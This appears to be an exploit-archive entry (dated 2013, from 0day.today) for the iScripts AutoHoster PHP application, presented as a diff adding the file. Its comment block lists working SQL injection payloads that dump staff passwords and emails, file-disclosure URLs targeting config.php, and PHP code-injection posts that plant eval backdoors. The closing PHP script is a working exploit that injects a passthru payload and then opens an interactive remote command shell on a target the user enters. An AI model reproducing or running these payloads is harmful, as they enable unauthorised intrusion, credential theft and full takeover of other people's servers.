@@ -1,0 +1,263 @@
+id: 21680
+date: 12/16/2013
+title: iScripts AutoHoster PHP Code Injection Vulnerability
+author: i-Hmx
+cves: 
+
+<?php
+/*
+[+] iScripts AutoHoster
+[+] Multiple vulnerabilities , PHP Code injection Exploit
+[+] Author : i-Hmx
+[+] n0p1337@gmail.com
+[+] sec4ever.com , 1337s.cc
+
+
+I.Sql Injection Vuln
+
+/checktransferstatus.php
+Table name : submit=faris&cmbdomain=i-Hmx' /*!1337union all select 0x6661726973,(select distinct concat(0x7e,0x27,unhex(Hex(cast(table_name as char))),0x27,0x7e) from information_schema.tables where table_schema=database()limit 53,1),0x723078 and 'faris'='1337
+Staff number : submit=faris&cmbdomain=i-Hmx' /*!1337union all select 0x6661726973,(select concat(0x3e3e,count(*),0x3c3c) from autohoster_staffs),0x723078 and 'faris'='1337
+Staff Data : submit=faris&cmbdomain=i-Hmx' /*!1337union all select 0x6661726973,(select concat(0x3e3e,unhex(Hex(cast(vPassword as char))),0x5e,unhex(Hex(cast(vLogin as char))),0x5e,unhex(Hex(cast(vMail as char))),0x3c3c) from autohoster_staffs limit 0,1) ,0x723078 and 'faris'='1337
+
+/checktransferstatusbck.php
+The same 
+
+II.Time based Blind Injection
+/additionalsettings.php
+Post : submit=faris&cmbdomain=%Inject_Here%
+
+/payinvoiceothers.php
+invno=%Inject_Here%
+
+Little note : Both might not work if magic_quotes_gps = on :(
+Dissapointed????
+Nop , don't be so dramatic 
+am here to show u the full movie 
+not just the sad part ;)
+Just keep reading
+
+III.Local File Disclosure
+/websitebuilder/showtemplateimage.php
+include_once "includes/session.php";
+include_once "includes/function.php";
+$templateid    = $_GET['tmpid'];
+$type      = $_GET['type'];
+if ($type == "home") {
+  $imagename  = "homepageimage.jpg";
+} else if($type == "sub") {
+  $imagename  = "subpageimage.jpg";
+} else {
+  $imagename  = "thumpnail.jpg";
+}
+readfile("./".$_SESSION["session_template_dir"]."/".$templateid."/$imagename");
+Hmmm , we can cancel the imagename value via the null byte %00
+[+] Exploit : /websitebuilder/showtemplateimage.php?tmpid=../../includes/config.php%00&type=sub
+
+/admin/downloadfile.php > probably injected by the Guy who nulled the script (thank u any way ;p)
+$filename  = urldecode($_GET['fname']);
+header("content-disposition:attachment;filename=$filename");
+readfile($filename)
+no need to cancel any thing , just beat it bro ;)
+[+] Exploit : /admin/downloadfile.php?fname=../includes/config.php
+
+/support/admin/csvdownload.php
+  $filename="../csvfiles/".addslashes($_GET["id"]).".txt";
+  header('Content-Description: File Transfer'); 
+  header('Content-Type: application/force-download'); 
+  header('Content-Length: ' . filesize($filename)); 
+  header('Content-Disposition: attachment; filename=' . basename($filename)); 
+  readfile($filename);
+[+] Exploit : /support/admin/csvdownload.php?id=../../includes/config.php%00
+
+IV.Directory tr. vuln
+/support/parser/main_smtp.php
+^
+Just light sandwitch before the fatty food :))
+
+
+V.PHP Code Injection Vuln.
+Here come the King :D
+
+/setup/TLDSetup.php
+  $tldselected = $HTTP_POST_VARS[ "tldselect" ];
+
+  $tldcount = count ($tldselected);
+  for ($j = 0; $j < $tldcount; $j++)
+  {
+      $tldList .= "<option <?php if ( \$cTld==\"" . $tldselected[$j] . "\" ) { echo \"selected\"; } ?>>" . $tldselected[$j] . "</option>\n";
+      $tldHoldList .= "\$" . str_replace(".", "", $tldselected[$j]) . "= 1;\n";
+  }
+
+  //set up TLD list
+  
+  if ($HTTP_POST_VARS[ "tldsetup" ] == 1 or $HTTP_POST_VARS[ "original" ] == 1) {    
+    $tldfile = fopen("./tldListOne.php", "w");
+    fwrite($tldfile, "<select name=\"tld\">\n" . $tldList . "</select>");
+    fclose($tldfile);    
+    $tldHoldfile = fopen("./tldHoldList.php", "w");
+    fwrite($tldHoldfile, "<?php\n" . $tldHoldList . "?>");
+    fclose($tldHoldfile);
+  }  
+oOps , what should we do yar?
+ so simple :)
+ just post these parameters to /setup/TLDSetup.php
+ tldsetup=1&tldselect[]=faris"){eval(base64_decode($_REQUEST[fa]));}elseif ($cTld=="lame&x=49&y=13
+ Damn simple :)
+ now just go to 
+ /setup/tldListOne.php
+ Enter ur base64 php code as value for the parameter fa
+ Example 
+ post parameter : fa=cGhwaW5mbygpOw==
+ this will eval phpinfo(); , u can replace it by fopening ur own php file
+ It's working , But magic_quotes_gpc will fu#* it up :(
+ Need cleaner file???
+ then post these parameters at : /setup/TLDSetup.php
+ Post : tldsetup=1&tldselect[]=faris=1337;eval(base64_decode($_REQUEST[fa]));$junk&x=49&y=13
+ Now ur eval code can be executed at /setup/tldHoldList.php
+ That's much better , huh?
+ No quotes , let magic_quotes_gpc suffer ;)
+
+
+
+/websitebuilder/createcustom.php
+if ($_POST["btnSubmit"] == "Create Custom Form") {
+    $message = "";
+    $txtEmailAddress = $_POST["txtEmailAddress"];//the form will be mailed to this email address on submission
+    $txtPageName = $_POST["txtPageName"];//the actual page name
+    $txtPageDisplayName = $_POST["txtPageDisplayName"];//for display in links
+    $txtPageHeading = $_POST["txtPageHeading"];//the heading of the page
+    $formelements = $_POST["formelements"];//holds the form elements to be embedded in the page
+
+    $formstart = "<table cellspacing='2' cellpadding='2' width='100%' border='0'><tr><td align='center'>" . $txtPageHeading . "</td></tr><tr><td>";
+
+    $formend = "</td></tr></table>";
+
+    $formtext = $formstart . $formelements . $formend;
+
+    if ($message != "") {
+        $message = "<br>Please correct the following errors to continue!" . $message;
+    } 
+    if ($message == "") {//if no error, proceed with creating page, inserting to database etc
+        $sql = "SELECT sm.vlinks, sm.vsub_sitelinks, tm.vlink_separator,tm.vsublink_separator,tm.vlink_type,tm.vsublink_type FROM " . $sitemaster . " sm INNER JOIN ".TABLE_PREFIX."template_mast tm ON sm.ntemplate_id = tm.ntemplate_mast ";
+        $sql .= " WHERE sm." . $siteidfield . "  = '" . addslashes($siteid) . "'"; 
+        // echo $sql;
+        $res = mysql_query($sql);
+        if (mysql_num_rows($res) != 0) {
+            $row = mysql_fetch_array($res);
+            $links = $row["vlinks"];
+            $sublinks = $row["vsub_sitelinks"];
+            $linkseparator = $row["vlink_separator"];
+            $sublinkseparator = $row["vsublink_separator"];
+            $linktype = $row["vlink_type"];
+            $sublinktype = $row["vsublink_type"];
+            $pagelink = "<a class=anchor1 href='./" . $txtPageName . "'>" . $txtPageDisplayName . "</a>";
+            if ($linktype == "horizontal") {
+                $newlink = $links . $linkseparator . $pagelink;
+            } else if ($linktype == "vertical") {
+                $newlink = $links . $linkseparator . $pagelink . "<br>";
+            } 
+
+            if ($sublinktype == "horizontal") {
+                $newsublink = $sublinks . $sublinkseparator . $pagelink;
+            } else if ($sublinktype == "vertical") {
+                $newsublink = $sublinks . $sublinkseparator . $pagelink . "<br>";
+            } 
+
+            if ($links != "") {
+                $sql = "UPDATE " . $sitemaster . " SET vlinks = '" . addslashes($newlink) . "', vsub_sitelinks='" . addslashes($newsublink) . "' WHERE " . $siteidfield . " = '" . addslashes($siteid) . "' ";
+                mysql_query($sql);//adding links to database
+                $pagename = $txtPageDisplayName;
+                $filename = $txtPageName;
+                $pagetitle = $txtPageDisplayName;
+                $pagetype = "custom";
+                $type = "simple";
+
+                $sql2 = "INSERT INTO " . $sitepagetable . "(" . $siteidfield . ", vpage_name,vpage_title,vpage_type,vtype) VALUES ('" . addslashes($siteid) . "','" . addslashes($pagename) . "','" . addslashes($pagetitle) . "','" . addslashes($pagetype) . "','" . addslashes($type) . "') ";
+                mysql_query($sql2); //adding the new page to database
+
+                $newfilename = $sitefoldername . "/" . $filename;
+                if ($sitepagesfoldername != "") {//if it is a temp site(not completed), then create a file in the sitepages folder also
+                    $newsitepagefilename = $sitepagesfoldername . "/" . $filename;
+                    $fp1 = fopen($newsitepagefilename, "w+");
+                    fwrite($fp1, $formtext);
+                    fclose($fp1);
+                } 
+ So , all we need  is valid authorized siteid :)
+ it's simple
+ Make new site
+ Go to Editing You site
+   Link will be like : editsitepageoption.php?type=new&actiontype=editsite&templateid=51&tempsiteid=1
+   tempsiteid=1 > that's what we need
+ now time for injection :)
+  Go to : websitebuilder/createcustom.php
+  Post parameters : siteid=1&btnSubmit=Create Custom Form&txtPageName=faris.php&formelements=<? phpinfo(); ?>
+  Damn obvious , hah ;)
+  Injected file is located at  : /websitebuilder/workarea/tempsites/1/faris.php
+
+
+Well , 
+this fool wasted me abt 80 mins  :|
+*/
+
+print "\n+-----------------------------+\n";
+print "|     iScripts AutoHoster     |\n";
+print "| PHP Code injection By i-Hmx |\n";
+print "|      n0p1337@gmail.com      |\n";
+print "|   sec4ever.com , 1337s.cc   |\n";
+print "+-----------------------------+\n";
+echo "\n| Enter Target [http://SITE.COM/PATH/] # ";
+$target=trim(fgets(STDIN));
+function kastr($string, $start, $end){
+    $string = " ".$string;
+    $ini = strpos($string,$start);
+    if ($ini == 0) return "";
+    $ini += strlen($start);
+    $len = strpos($string,$end,$ini) - $ini;
+    return substr($string,$ini,$len);
+}
+function faget($url,$post){
+$curl=curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($curl,CURLOPT_URL,$url);
+curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
+curl_setopt($curl, CURLOPT_COOKIEFILE, '/'); 
+curl_setopt($curl, CURLOPT_COOKIEJAR, '/'); 
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+curl_setopt($curl, CURLOPT_HEADER, false); 
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+echo "\n| Injecting Payload\n";
+faget($target."/setup/TLDSetup.php/",'tldsetup=1&tldselect[]=faris=1337;passthru(base64_decode($_REQUEST[fa]));$junk&x=49&y=13');
+
+if (!preg_match("/passthru()/", faget($target."/setup/tldHoldList.php", "")))
+{
+die("\n[-] Exploit Failed\n");
+}
+$myh=kastr($target,"//","/");
+print "| sec4ever shell online\n";
+while(1)
+{
+    print "\ni-Hmx@$myh# ";
+  $fa=trim(fgets(STDIN));
+  if($fa=="exit")
+  {
+  die("\n[*] Terminating\n");
+  }
+  $fax=base64_encode($fa);
+    $fadata = faget($target."/setup/tldHoldList.php?fa=$fax","");
+    print $fadata;
+}
+/*
+Msg for *** ******
+Don't sell what's not belonging to you :)
+have a good day
+*/
+?>
+
+#  0day.today [2023-03-24]  #
